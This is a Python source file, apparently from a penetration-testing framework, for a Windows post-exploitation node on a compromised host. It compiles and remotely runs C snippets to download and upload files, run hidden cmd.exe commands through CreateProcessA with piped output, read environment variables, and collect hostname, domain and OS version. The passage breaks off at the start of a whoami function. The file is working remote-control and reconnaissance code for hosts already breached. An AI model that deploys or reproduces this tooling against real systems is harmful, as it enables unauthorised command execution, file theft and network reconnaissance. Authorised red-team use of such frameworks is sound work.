        ret=sint32(self.readint())
        #print "Read int"
        self.leave()
        if not ret:
            return -1
        return 0


    def cd(self,dest):
        """
        change dir
        """
        if sint32(self.chdir(dest)) == -1:
            return "No such directory, drive, or no permissions to access that directory."
        return "Successfully changed to %s"%(dest)


    def CreateFile(self,filename,access,sharemode,security,creationdisposition,flags):
        """
        This returns -1 on failure. Currently we don't return errno

        http://www.cs.rpi.edu/courses/fall01/os/CreateFile.html
        http://msdn.microsoft.com/library/default.asp?url=/library/en-us/fileio/base/readfile.asp
        """
        if security==None:
            security=0

        vars={}
        vars["filename"]=filename
        vars["flags"]=flags
        vars["sharemode"]=sharemode
        vars["templatefile"]=0
        vars["security"]=security
        vars["access"]=access
        vars["creationdisposition"]=creationdisposition

        code="""
        //start of code
        #import "local","kernel32.dll|CreateFileA" as "CreateFile"
        #import "local","sendlonglong" as "sendlonglong"
        #import "string","filename" as "filename"
        #import "int","flags" as "flags"
        #import "int","sharemode" as "sharemode"
        #import "int","access" as "access"
        #import "int","creationdisposition" as "creationdisposition"
        #import "int","templatefile" as "templatefile"
        #import "int","security" as "security"
        //#import "local","debug" as "debug"

        void main()
        {
            long long i;
            //debug();
            i=CreateFileA(filename,access,sharemode,security,creationdisposition,flags,templatefile);
            sendlonglong(i);
        }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readlonglong()
        self.leave()
        return ret

    def GetFileInformationByHandle(self,handle):
        """
        http://msdn.microsoft.com/library/default.asp?url=/library/en-us/fileio/base/getfileinformationbyhandle.asp
        The FILETIME data structure is a 64-bit value representing the number of 100-nanosecond intervals since January 1, 1601.
        """
        vars={}
        vars["handle"]=handle
        code="""
        #import "local","sendint" as "sendint"
        #import "local","kernel32.dll|GetFileInformationByHandle" as "GetFileInformationByHandle"
        #import "long long","handle" as "handle"

        struct FILETIME {
            int dwLowDateTime;
            int dwHighDateTime;
        };

        struct BY_HANDLE_FILE_INFORMATION
        {
            int    dwFileAttributes;
            struct FILETIME ftCreationTime;
            struct FILETIME ftLastAccessTime;
            struct FILETIME ftLastWriteTime;
            int    dwVolumeSerialNumber;
            int    nFileSizeHigh;
            int    nFileSizeLow;
            int    nNumberOfLinks;
            int    nFileIndexHigh;
            int    nFileIndexLow;
        };

        void sendFILETIME(struct FILETIME *ft) {
           sendint(ft->dwLowDateTime);
           sendint(ft->dwHighDateTime);
        }

        void main()
        {
          int i;
          struct BY_HANDLE_FILE_INFORMATION fi;

          i=GetFileInformationByHandle(handle,&fi);
          sendint(i);
          sendint(fi.dwFileAttributes);
          sendFILETIME(&fi.ftCreationTime);
          sendFILETIME(&fi.ftLastAccessTime);
          sendFILETIME(&fi.ftLastWriteTime);
          sendint(fi.dwVolumeSerialNumber);
          sendint(fi.nFileSizeHigh);
          sendint(fi.nFileSizeLow);
          sendint(fi.nNumberOfLinks);
          sendint(fi.nFileIndexHigh);
          sendint(fi.nFileIndexLow);

        }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint()
        dwFileAttributes=self.readint()
        ftCreationTime=self.readstruct([("l","dwLowDateTime"),("l","dwHighDateTime")])
        ftLastAccessTime=self.readstruct([("l","dwLowDateTime"),("l","dwHighDateTime")])
        ftLastWriteTime=self.readstruct([("l","dwLowDateTime"),("l","dwHighDateTime")])
        dwVolumeSerialNumber=self.readint()
        nFileSizeHigh=self.readint()
        nFileSizeLow=self.readint()
        nNumberOfLinks=self.readint()
        nFileIndexHigh=self.readint()
        nFileIndexLow=self.readint()
        self.leave()

        return (ret,dwFileAttributes,ftCreationTime,ftLastAccessTime,
                ftLastWriteTime,dwVolumeSerialNumber,nFileSizeHigh,nFileSizeLow,
                nNumberOfLinks,nFileIndexHigh,nFileIndexLow)

    def readblock(self, fileobj=None):
        """
        Reads one block at a time...<int><buf>

        We read as much as we can off the socket, and if fileobj is
        an actual file, we write it directly into the file (after decoding it)
        otherwise, we return the data

        Having a file as an option allows us to grab huge chunks of data from
        the socket without storing them all in our memory. Storing everything
        in ram is a bad idea for SILICA or other memory-restricted environments.
        """
        data=[]
        tmp=""
        wanted=self.readint() #the size we are recieving
        #print "win32 readblock() wanted=%d"%wanted
        while wanted>0:
            #print "before recv %d"%wanted
            #cap the amount we recv in one go at 1024, in case we
            #have a particularally large number.
            #we don't want to use up all of our ram in this reliable recv
            recvsize=1024
            if wanted < recvsize:
                recvsize=wanted
            if self.isapidict!={}:
                tmp=self.myexploit.webrecv(self.connection,size=recvsize)
            else:
                tmp=self.node.parentnode.recv(self.connection,recvsize)
            #print "after recv %d"%len(tmp)
            if tmp=="":
                logging.error("Connection broken?")
                break
            #print "data+=%s"%prettyprint(tmp)
            #print "Data in readblock += len=%d"%len(tmp)
            if fileobj==None:
                data.append(tmp)
            else:
                fileobj.write(self.decode(tmp))
                fileobj.flush()
            wanted=wanted-len(tmp)
        data="".join(data)
        data=self.decode(data)
        #print "Done with readblock"
        #print data
        return data


    def readblocks(self):
        """
        readint(X)
        read(X) bytes
        until X is 0
        """
        ret=[]
        block="A"
        while block!="":
            block=self.readblock()
            ret+=[block]
        ret="".join(ret)
        return ret


    def readfilefromfd(self, fd, filesize, outfile):
        """
        Reads from an open fd on the remote host
        into an open file object on the localhost
        -1 size is read till closed.
        """

        vars            = {}
        vars["bufsize"] = filesize
        vars["filefd"]  = fd
        code = """
            #import "local", "kernel32.dll|ReadFile" as "readfile"
            #import "local", "writeblock2self" as "writeblock2self"

            #import "int", "bufsize" as "bufsize"
            #import "long long", "filefd" as "filefd"
            #import "local","sendint" as "sendint"

            void main () {
                char buf[1001];
                int numread;
                int ret;
        """
        if filesize != -1:
            code += """
                // used when we know what size we are reading
                // such as for a file
                int left;

                left = bufsize;
                while (left > 1000) {
                    ReadFile(filefd, buf, 1000, &numread, 0);
                    ret = writeblock2self(buf, 1000);
                    if (ret == 0) {
                        sendint(0);
                        return;
                    }
                    else {
                        left = left - 1000;
                    }
                }

                if (left > 0) {
                    ReadFile(filefd, buf, left, &numread, 0);
                    ret = writeblock2self(buf, left);
                    if (ret == 0) {
                        sendint(0);
                        return;
                    }
                }
            """
        else:
            # this is the code used in popen2()
            code += """
                // used when we have no idea what size we are reading
                // sending a 0 sized block ends our transmission
                int i;

                i = 1;
                while (i != 0) {
                    i = ReadFile(filefd, buf, 1000, &numread, 0);
                    sendint(numread);
                    ret = writeblock2self(buf, numread);
                    if (ret == 0) {
                        sendint(0);
                        return;
                    }
                }

            """
        code += """
            // success
            sendint(1);
        }
        """

        self.clearfunctioncache()
        request = self.compile(code, vars)
        self.sendrequest(request)

        # this is not good...
        if filesize != -1:
            data = self.readbufintofile(filesize, outfile)
        else:
            data = self.readblocksintofile(outfile)
        self.leave()

        ret = sint32(self.readint(signed = True))
        return ret

    def writebuffromfile(self, infile):
        """
        Writes data from a file down the wire
        """
        data = infile.read(1000)
        while data != "":
            self.writebuf(data)
            data = infile.read(1000)
        return

    def writefiletofd(self, fd, infile):
        """
        Writes the data from infile to fd (on remote side)
        """
        vars    = {}
        oldtell = infile.tell()
        infile.seek(0, 2) # seek to the end
        datalen = infile.tell()
        infile.seek(oldtell)

        vars["bufsize"] = datalen
        vars["filefd"]  = fd
        self.log("[+] Writing %d bytes to FD(0x%x)" % (datalen, fd))

        code = """
            #import "local", "sendint" as "sendint"
            #import "local", "readdatafromself" as "readdatafromself"
            #import "local", "kernel32.dll|WriteFile" as "WriteFile"

            #import "int", "bufsize" as "bufsize"
            #import "long long", "filefd" as "filefd"

            void main () {
                char buf[1001];
                int left;
                int numwritten;
                int ret;

                left = bufsize;
                while (left > 1000) {
                    ret = readdatafromself(buf, 1000);
                    if (ret == 0) {
                        sendint(0);
                        return;
                    }

                    ret = WriteFile(filefd, buf, 1000, &numwritten, 0);
                    if (ret == 0) {
                        sendint(0);
                        return;
                    }
                    else {
                        left = left - 1000;
                    }
                }

                if (left > 0) {
                    ret = readdatafromself(buf, left);
                    if (ret == 0) {
                        sendint(0);
                        return;
                    }

                    ret = WriteFile(filefd, buf, left, &numwritten, 0);
                    if (ret == 0) {
                        sendint(0);
                        return;
                    }
                }

                sendint(1);
            }
        """
        self.clearfunctioncache()
        request = self.compile(code, vars)
        self.sendrequest(request)
        self.writebuffromfile(infile)
        ret = sint32(self.readint(signed = True))
        self.leave()
        return ret

    def CloseHandle(self, handle):
        """
        Closes the handle

        http://msdn.microsoft.com/library/default.asp?url=/library/en-us/sysinfo/base/closehandle.asp
        Success is ret==non zero
        Doh: Windows NT/2000/XP:  Closing an invalid handle raises an exception when the application is running under a debugger.
        This includes closing a handle twice, and using CloseHandle on a handle returned by the FindFirstFile function.
        """

        code = """
        //start of code
        #import "local","kernel32.dll|CloseHandle" as "CloseHandle"
        #import "long long","handle" as "handle"
        #import "local", "sendint" as "sendint"

        void main()
        {
            int i;
            i=CloseHandle(handle);
            sendint(i);
        }
        """
        vars={}
        vars["handle"]=handle
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=None
        ret=self.readint() #we're gone!
        self.leave()

        return sint32(ret)


    def readbufintofile(self,size,outfile):
        """
        Reads data from a buffer remotely into our outfile
        """

        logging.debug("Outfile: %s" % outfile)

        neededsize=size
        while neededsize>0:
            #print neededsize
            if neededsize>9000:
                getsize=9000
            else:
                getsize=neededsize

            data=self.reliableread(getsize)
            outfile.write(data)
            neededsize=neededsize-getsize
        return 1


    def download(self, source, dest = "."):
        """
        Downloads a file from the remote server
        """
        infile = self.CreateFile(source, GENERIC_READ, FILE_SHARE_READ, None,
                                 OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL)

        if infile < 0:
            raise NodeCommandError("Couldn't open remote file %s" % source)

        if os.path.isdir(dest):
            dest = os.path.join(dest, source.replace("/", "_").replace("\\", "_"))

        (ret, dwFileAttributes, ftCreationTime, ftLastAccessTime,
         ftLastWriteTime, dwVolumeSerialNumber, nFileSizeHigh, nFileSizeLow,
         nNumberOfLinks, nFileIndexHigh, nFileIndexLow) = self.GetFileInformationByHandle(infile)

        if ret != 1:
            # self.log("Ret %s"%ret)
            self.CloseHandle(infile)
            raise NodeCommandError("GetFileInformation failed on file %s" % source)

        size = nFileSizeLow
        self.log("[ii] Downloading %s bytes" % size)

        outfile = open(dest, "wb")
        if outfile == None:
            raise NodeCommandError("Couldn't open local file %s" % dest)

        # self.log("infile = %8.8x" % infile)

        # read directly into a file
        # should not use that much ram
        self.readfilefromfd(infile, size, outfile)

        ret = self.CloseHandle(infile)
        #if ret<0:
        #    self.log("Some kind of error closing fd %d"%infile)
        outfile.close() # close local file
        logging.info("File downloaded at %s" % dest)
        return "[ii] Saved data into %s" % (dest)

    def upload(self, source, dest = "", destfilename = None, sourceisbuffer=False ):
        """
        Uploads a file to the remote host
        """
        if sourceisbuffer:
            #source is our upload buffer
            tFile=StringIO.StringIO(source)
        else:
            #source is the filename
            try:
                tFile = open(source, "rb")
                # alldata = tFile.read() bad idea
                # tFile.close()
            except (OSError, IOError), e:
                raise NodeCommandError("Error while reading input file: %s" % str(e))

        if dest:
            if dest.endswith('/'):
                dest = dest[:-1] + '\\'
            elif not dest.endswith('\\'):
                dest = dest + '\\'

        if destfilename:
            destfile = destfilename
        else:
            # strip any leading path away
            self.log("[ii] Stripping path from: %s" % (source))
            source = strip_leading_path(source)
            destfile = dest + source

        self.log("[ii] Trying to create %s" % (destfile))
        newfile = self.CreateFile(destfile, GENERIC_WRITE, FILE_SHARE_READ, None,
                                  CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL)
        if newfile < 0:
            raise NodeCommandError("Could not create remote file")

        # now write the data directly down the pipe
        ret = self.writefiletofd(newfile, tFile)
        if ret == 0:
            # Avoid leaving empty/corrupted files around
            self.CloseHandle(newfile)
            ret = self.unlink(destfile)

            raise NodeCommandError("Error while writing file to remote end")

        self.log("[ii] File uploaded successfully")

        ret = self.CloseHandle(newfile)
        if sint32(ret) == -1:
            raise NodeCommandError("Error while trying to close remote file")

        tFile.close()
        return 1

    def runcommand(self,command):
        """
        Runs a command via popen
        """
        data = ""
        data = self.popen2(command)
        return data

    def gethostbyname(self, hostname, parse=True):
        """
        Returns <value>, success
        """

        #clear off \n and null terminaters first
        hostname=hostname.strip()

        if not hostname:
            return 0, ""

        if hostname[-1] == "\x00":
            hostname = hostname[:-1]

        if not hostname[0].isalpha():
            #you sent us an IP Address!
            return 1, [hostname]
        else:
            #is a hostname
            code="""
            #import "local", "ws2_32.dll|gethostbyname" as "gethostbyname"
            #import "local", "kernel32.dll|GetLastError" as "GetLastError"

            #import "local", "sendint" as "sendint"
            #import "string", "hostname" as "hostname"

            struct hostent {
            char * h_name;
            char **aliases;
            short h_addrtype;
            short h_length;
            char **h_addr_list;
            };
            //h_addr_list is a null terminated list of addresses for the host in network
            //byte order

            void main()
            {
               int i;
               int ret;
               int error;
               int * p;
               struct hostent * remoteHost;
               remoteHost=gethostbyname(hostname);
               error=GetLastError();
               sendint(remoteHost);
               //ret of zero indicates failure
               if (remoteHost==0) {
                 sendint(error);
                }
                else {
                  p=remoteHost->h_addr_list;
                  p=*p;
                  ret=*p; //haddr[0] is the first address
                  i=0; //count of host many addresses we've sent
                  //maximum of 8 addresses, although MSDN doesn't mention this
                  while (i<8 && ret!=0) {
                     sendint(ret);
                     p=p+1; //advance p += 8 bytes
                     ret=*p; //ret is the next address
                     i=i+1;
                  }
                  sendint(0);
                }
            }
            """
        vars={}
        vars["hostname"]=hostname

        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint()
        #print "Got %x as return value from gethostbyname"%ret
        ##Non zero return on success
        error=0
        if ret==0:
            error=self.readint()
            devlog("win32","GetLastError returned %x for gethostbyname"%error)
        else:
            #read until there are no more addresses left
            #and put them in our val array
            val=[]
            addr=self.readint()
            while addr!=0:
                logging.debug("Got addr: %x"%addr)
                #these integers are backwards for some reason
                #so we use intel_order rather than big_order to reverse them
                if parse:
                    val += [socket.inet_ntoa(intel_order(addr))]
                else:
                    val += [addr]

                addr=self.readint()
        self.leave()
        if ret==0:
            return ret, error
        return ret, val

    def gethostname(self):
        """
        Call gethostname() on connected node and return hostname string.
        Return None on error.
        """

        code = """
        #import "local",  "sendstring" as "sendstring"
        #import "local",  "ws2_32.dll|gethostname"   as "gethostname"

        void main()
        {
            int ret;
            char hostname[256];

            ret = gethostname(&hostname, 256);
            sendint(ret);

            if (ret == 0) {
                sendstring(hostname);
            }
        }
        """

        self.clearfunctioncache()
        request = self.compile(code, {})
        self.sendrequest(request)
        ret = self.readint()

        if ret == 0:
            ret = self.readstring()
        else:
            ret = None

        self.leave()
        return ret


    def getdomain(self):
        """
        Calls DsRoleGetPrimaryDomainInformation() on connected node and returns
        a dictionary filled with the content of a DSROLE_PRIMARY_DOMAIN_INFO_BASIC
        structure if the call succeeds.
        Return None on error.
        """

        code = """
        #import "local", "senddata2self" as "senddata2self"
        #import "local", "sendunistring2self" as "sendunistring2self"
        #import "local", "dsrole.dll|DsRoleGetPrimaryDomainInformation" as "DsRoleGetPrimaryDomainInformation"

        void main()
        {
            int ret;
            char *Buffer;
            long long *ptr;

            Buffer = 0;
            ptr = 0;
            ret = DsRoleGetPrimaryDomainInformation(NULL, 1, &Buffer);
            sendint(ret);

            if (ret == 0) {
                senddata2self(Buffer, 48);
                ptr = Buffer;
                ptr = ptr + 1;
                sendunistring2self(*ptr);
                ptr = ptr + 1;
                sendunistring2self(*ptr);
                ptr = ptr + 1;
                sendunistring2self(*ptr);
            }

        }
        """

        self.clearfunctioncache()
        request = self.compile(code, {})
        self.sendrequest(request)
        ret = self.readint()

        if ret == 0:

            try:
                ret = {}
                dsrole_buffer = self.readblock()
                MachineRole,Flags = struct.unpack('<LL', dsrole_buffer[:8])
                DomainNameFlat = self.readblock().decode('UTF-16LE')
                DomainNameDns = self.readblock().decode('UTF-16LE')
                DomainForestName = self.readblock().decode('UTF-16LE')
                ret['MachineRole'] = MachineRole
                ret['Flags'] = Flags
                ret['DomainNameFlat'] = DomainNameFlat
                ret['DomainNameDns'] = DomainNameDns
                ret['DomainForestName'] = DomainForestName
            except Exception as e:
                ret = None

        else:
            ret = None

        self.leave()
        return ret


    def CreatePipe(self):
        """
        Calls CreatePipe and returns a tuple (return code, read pipe, write pipe)
        """

        vars={}
        code="""
        #import "local", "kernel32.dll|CreatePipe" as "CreatePipe"
        #import "local","sendint" as "sendint"
        #import "local","sendlonglong" as "sendlonglong"

        struct SECURITY_ATTRIBUTES {
          int nLength;
          int * lpSecurityDescriptor;
          int bInheritHandle;
        };

        void main() {
          struct SECURITY_ATTRIBUTES sa;
          int ret;
          unsigned long long readpipe;
          unsigned long long writepipe;

          sa.nLength=16;
          //sa.nLength=12;
          sa.lpSecurityDescriptor=0;
          sa.bInheritHandle=1;

          ret=CreatePipe(&readpipe,&writepipe,&sa,0);
          sendint(ret);
          sendlonglong(readpipe);
          sendlonglong(writepipe);
        }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)

        ret=sint32(self.readint())
        readpipe=self.readlonglong()
        writepipe=self.readlonglong()
        self.leave()

        return (ret,readpipe,writepipe)

    def GetEnvironmentVariable(self,variablename):
        """
        http://msdn.microsoft.com/library/default.asp?url=/library/en-us/dllproc/base/getenvironmentvariable.asp
        returns the environment variable
        """

        vars={}
        vars["envname"]=variablename
        code="""
        #import "local", "kernel32.dll|GetEnvironmentVariableA" as "getenvironmentvariable"
        #import "local","sendstring" as "sendstring"
        #import "local","sendint" as "sendint"
        #import "string","envname" as "envname"

        void main() {
          int ret;
          char outbuf[5000];
          ret=GetEnvironmentVariableA(envname,outbuf,4999);
          //ret=getenvironmentvariable(envname,outbuf,4999);
          sendint(ret);
          if (ret<5000) {
            sendstring(outbuf);
          }
        }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)

        ret=self.readint()
        retbuffer=""
        if ret<5000:
            retbuffer=self.readstring()
        else:
            self.log("Getenv %s wanted %d bytes!"%(variablename,ret))
        self.leave()
        return retbuffer

    def GetCurrentProcess(self):

        if self.currentprocess!=None:
            return self.currentprocess

        vars={}
        code="""
        #import "local", "kernel32.dll|GetCurrentProcess" as "GetCurrentProcess"
        #import "local","sendlonglong" as "sendlonglong"

        void main() {
          long long ret;

          ret=GetCurrentProcess();
          sendlonglong(ret);
        }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)

        self.sendrequest(request)

        ret=self.readlonglong()
        self.leave()

        logging.debug("GetCurrentProcess: %s" % ret)

        return ret

    def DuplicateHandle(self,handle,sourceprocess=None,destprocess=None,inheritable=0,access=DUPLICATE_SAME_ACCESS):
        """
        duplicates the handle
        http://msdn.microsoft.com/library/default.asp?url=/library/en-us/sysinfo/base/duplicatehandle.asp
        """

        if sourceprocess==None:
            sourceprocess=self.GetCurrentProcess()

        if destprocess==None:
            destprocess=self.GetCurrentProcess()

        sourceprocess = -1
        destprocess = -1


        vars={}
        vars["sourceprocess"]=sourceprocess
        vars["sourcehandle"]=handle
        vars["targetprocess"]=destprocess
        vars["desiredaccess"]=access
        vars["options"]=DUPLICATE_SAME_ACCESS
        vars["inherithandle"]=inheritable
        code="""
        #import "local", "kernel32.dll|DuplicateHandle" as "DuplicateHandle"
        #import "local","sendlonglong" as "sendlonglong"
        #import "local","sendint" as "sendint"
        #import "long long", "sourceprocess" as "sourceprocess"
        #import "long long", "targetprocess" as "targetprocess"
        #import "long long", "sourcehandle" as "sourcehandle"
        #import "int", "desiredaccess" as "desiredaccess"
        #import "int", "options" as "options"
        #import "int", "inherithandle" as "inherithandle"

        void main() {
          int ret;
          long long newhandle;

          ret=DuplicateHandle(sourceprocess,sourcehandle,targetprocess,&newhandle,desiredaccess,inherithandle,options);
          sendint(ret);
          sendlonglong(newhandle);
        }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)

        ret=sint32(self.readint())
        newhandle=self.readlonglong()
        self.leave()
        return (ret, newhandle)



    def getComSpec(self):
        if self.cached_comspec!="":
            return self.cached_comspec
        self.cached_comspec=self.GetEnvironmentVariable("COMSPEC")
        logging.debug("Set cached_comspec to %s"%self.cached_comspec)
        return self.cached_comspec



    def readfromfd(self,fd,filesize):
        """ Reads from an open fd on the remote host
            -1 size means read till closed
        """

        vars={}
        vars["bufsize"]=filesize
        vars["filefd"]=fd
        code="""
        #import "local", "kernel32.dll|ReadFile" as "ReadFile"
        #import "local", "writeblock2self" as "writeblock2self"
        //#import "local", "debug" as "debug"
        #import "int", "bufsize" as "bufsize"
        #import "long long", "filefd" as "filefd"
        #import "local","sendint" as "sendint"

        void main () {
        char buf[1001];
        int numread;

        """
        if filesize!=-1:
            code+="""
                // used when we know what size we are reading...
                // such as for a file
                int left;

                left=bufsize;
                //debug();
                while (left>1000) {
                    ReadFile(filefd,buf,1000,&numread,0);
                    writeblock2self(buf,1000);
                    left=left-1000;
                }

                if (left>0) {
                    ReadFile(filefd,buf,left,&numread,0);
                    writeblock2self(buf,left);
                }
            """
        else:
            code+="""
                // used when we have no idea what size we are reading...
                // sending a 0 sized block ends our transmission
                int i;

                i=1;
                while (i!=0) {
                    i=ReadFile(filefd,buf,1000,&numread,0);
                    sendint(numread);
                    writeblock2self(buf,numread);
                }

                """
        code+="""

        }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        if filesize!=-1:
            data=self.readbuf(filesize)
        else:
            data=self.readblocks()
        self.leave()
        return data


    def popen2(self,command):
        """
        runs a command and returns the result
        Note how it uses TCP's natural buffering, and
        doesn't require a ping-pong like protocol.
        """

        vars={}
        vars["command"]=command

        """
        Uses better popen techniques than real popen()
        Also gets stderr, theoretically
        This function took a long time to write. In the future, remember that:
        1. CreateProcessA needs to be called with inheritance set to 1, else, broken pipe results
        2. You have to close the writable stdout pipe or the pipe blocks on any read. Do this
           AFTER you call CreateProcessA to send it to a child process

        """

        if command=="":
            return "You need to enter in a command."

        cmdexe=self.getComSpec()
        #cmdexe="C:\\winnt\\temp\\testmemcpy.exe"
        vars["cmdexe"]=cmdexe

        #the result here is both inheritable
        (ret,hChildStdinRd,hChildStdinWr)=self.CreatePipe()
        if ret==0:
            #failed to create pipe
            return "Failed to create pipe!"

        #print "Pipe created: %x %x"%(hChildStdinRd,hChildStdinWr)

        #Create a non-inheritable duplicate
        (ret,hChildStdinWrDup)=self.DuplicateHandle(hChildStdinWr)
        if ret==0:
            return "Failed to duplicate handle for writing"

        #print "Handle duplicated: %x"%hChildStdinWrDup


        #we need to close ours, since we don't want the child to inherit it!
        #print "Closing %x"%hChildStdinWr

        self.CloseHandle(hChildStdinWr)

        #print "Handle closed"

        (ret,hChildStdoutRd,hChildStdoutWr)=self.CreatePipe()
        if ret==0:
            #failed to create pipe
            return "Failed to create stdout pipe!"

        #print "Pipe created: %x %x"%(hChildStdoutRd,hChildStdoutWr)

        #print "Duplicating: %x"%(hChildStdoutRd)

        (ret,hChildStdoutRdDup)=self.DuplicateHandle(hChildStdoutRd)
        if ret==0:
            return "Failed to duplicate handle for reading"

        #print "Closing %x"%hChildStdoutRd
        self.CloseHandle(hChildStdoutRd)

        command="cmd.exe /c "+command


        vars={}
        vars["command"]=command
        vars["cmdexe"]=cmdexe
        vars["stdin"]=hChildStdinRd
        vars["stdout"]=hChildStdoutWr
        code="""
        #import "local","sendint" as "sendint"
        #import "local","kernel32.dll|GetStartupInfoA" as "GetStartupInfoA"
        #import "local","kernel32.dll|CreateProcessA" as "CreateProcessA"
        #import "string","cmdexe" as "cmdexe"
        #import "string","command" as "command"
        #import "local", "memset" as "memset"
        #import "long long", "stdin" as "stdin"
        #import "long long", "stdout" as "stdout"
        //#import "local", "debug" as "debug"

        struct STARTUPINFO {
            int cb;
            //int alignment1;
            char* lpReserved;
            char* lpDesktop;
            char* lpTitle;
            int dwX;
            int dwY;
            int dwXSize;
            int dwYSize;
            int dwXCountChars;
            int dwYCountChars;
            int dwFillAttribute;
            int dwFlags;
            short int wShowWindow;
            short int cbReserved2;
            //int alignment2;
            int * lpReserved2;
            long long hStdInput;
            long long hStdOutput;
            long long hStdError;
        };

        //void main2() {
        //  debug();
        //  main2();
        //}

        void main() {
          struct STARTUPINFO si;
          int inherithandles;
          int i;
          char pi[32];

          memset(pi,0,16);
          inherithandles=1;

          GetStartupInfoA(&si);

          si.dwFlags=0x0101; //STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW
          si.wShowWindow=0;
          si.hStdInput=stdin;
          si.hStdOutput=stdout;
          si.hStdError=stdout;
          //CreateProcess: http://msdn.microsoft.com/library/default.asp?url=/library/en-us/dllproc/base/createprocess.asp
          i=CreateProcessA(cmdexe,command,0,0,inherithandles,0,0,0,&si,pi);
          sendint(i);
        }

        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint()
        self.leave()

        if ret!=1:
            return "Failed to CreateProcessA on cmd.exe!"
        else:
            pass
            #print "Process spawned"

        #must close this side of the handle before reading from pipe
        self.CloseHandle(hChildStdoutWr)
        #print "Closed %x"%hChildStdoutWr

        retdata=self.readfromfd(hChildStdoutRdDup,-1)
        retdata=self.localize_string(retdata)
        #cleanup
        self.CloseHandle(hChildStdoutRdDup)
        self.CloseHandle(hChildStdinWrDup)
        self.CloseHandle(hChildStdinRd)

        return retdata

    def unlink(self, filename, error=False):

        vars={}
        vars["filename"]=filename
        code="""
        //start of code
        //_unlink doesn't always exist, so we use remove instead now

        #import "local", "msvcrt.dll|remove" as "remove"
        #import "local","sendint" as "sendint"
        #import "string","filename" as "filename"

        void main()
        {
            int i;
            i=remove(filename);
            sendint(i);
        }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint()
        self.leave()
        if not ret:
            return "%s was unlinked."%filename
        else:
            if error:
                raise Exception('%s was not deleted' % filename)
            else:
                return "%s was not unlinked due to some kind of error."%filename

    def os_major_geq(self, major=10):
        code = """
        #import "local", "ntdll.dll|RtlGetVersion" as "RtlGetVersion"

        #import "local", "sendint" as "sendint"
        #import "local", "memset" as "memset"

        #import "int", "major" as "major"

        struct RTL_OSVERSIONINFOW {
            int dwOSVersionInfoSize;
            int dwMajorVersion;
            int dwMinorVersion;
            int dwBuildNumber;
            int dwPlatformId;
            short szCSDVersion[128];
            short wServicePackMajor;
            short wServicePackMinor;
            short wSuiteMask;
            // it's possible there's 2 characters here, for padding? I hope not.
            char wProductType;
            char wReserved;
            int pad; //dunno why this is here. But it is.
        };

        int main(){
           int ret;
           int size;
           struct RTL_OSVERSIONINFOW osvi;

           ret = 0;
           size = 288; // sizeof(RTL_OSVERSIONINFOW) + 4 (for whatever reason)

           memset(&osvi, 0, size);
           osvi.dwOSVersionInfoSize = size;

           RtlGetVersion(&osvi);
           if (osvi.dwMajorVersion==major){
               ret = 1;
           }
           if (osvi.dwMajorVersion > major){
             ret = 1;
           }
           sendint(ret);
        }
        """

        self.clearfunctioncache()
        request=self.compile(code,{"major": major})
        self.sendrequest(request)
        ret = self.readint()
        self.leave()

        return ret

    def os_producttype(self):
        code = """
        #import "local", "ntdll.dll|RtlGetVersion" as "RtlGetVersion"

        #import "local", "sendint" as "sendint"
        #import "local", "memset" as "memset"

        struct RTL_OSVERSIONINFOEXW {
            int dwOSVersionInfoSize;
            int dwMajorVersion;
            int dwMinorVersion;
            int dwBuildNumber;
            int dwPlatformId;
            short szCSDVersion[128];
            short wServicePackMajor;
            short wServicePackMinor;
            short wSuiteMask;
            char wProductType;
            char wReserved;
            int pad;
        };

        int main(){
           int ret;
           int size;
           struct RTL_OSVERSIONINFOEXW osvi;

           ret = 0;
           size = 284;

           memset(&osvi, 0, size);
           osvi.dwOSVersionInfoSize = size;

           RtlGetVersion(&osvi);
           ret = osvi.wProductType;
           sendint(ret);
        }
        """

        self.clearfunctioncache()
        request=self.compile(code,{})
        self.sendrequest(request)
        ret = self.readint()
        self.leave()

        return ret


    def MoveFileEx(self, filename, newfilename, flags):
        """
        Call kernel32!MoveFileEx
        If `newfilename' is None, a NULL pointer will be passed.
        """
        code = """
        #import "local", "kernel32.dll|MoveFileExA" as "MoveFileExA"
        #import "local", "kernel32.dll|GetLastError" as "GetLastError"
        #import "local", "sendint" as "sendint"
        #import "string", "FILENAME" as "FILENAME"
        #import "string", "NEWFILENAME" as "NEWFILENAME"
        #import "int", "FLAGS" as "FLAGS"

        void main()
        {
            int i;

            i = MoveFileExA(FILENAME, NEWFILENAME, FLAGS);
            if (i == 0) {
                i = GetLastError();
            } else {
                i = 0;
            }

            sendint(i);
        }
        """

        vars = {
            'FILENAME'    : filename,
            'NEWFILENAME' : newfilename,
            'FLAGS'       : flags,
        }


        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret = self.readint()
        self.leave()

        return ret

    def getComputerName(self):
        """
        GetComputerName
        http://msdn.microsoft.com/library/default.asp?url=/library/en-us/sysinfo/base/getcomputernameex.asp
        """

        vars={}
        code="""
        #import "local", "kernel32.dll|GetComputerNameA" as "GetComputerNameA"
        #import "local","sendstring" as "sendstring"
        #import "local","sendint" as "sendint"
        void main() {
          int ret;
          char outbuf[51];
          int len;

          len=50;

          ret=GetComputerNameA(outbuf,&len);

          sendint(ret);
          if (ret!=0) {
            sendstring(outbuf);
          }
        }

        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)

        ret=self.readint()
        retbuffer=""
        if ret!=0:
            retbuffer=self.readstring()
        else:
            self.log("getComputerName failed?")
            retbuffer="Unknown!"
        self.leave()
        return retbuffer

    def whoami(self, name_format=2):  # NameSamCompatible=2
        """
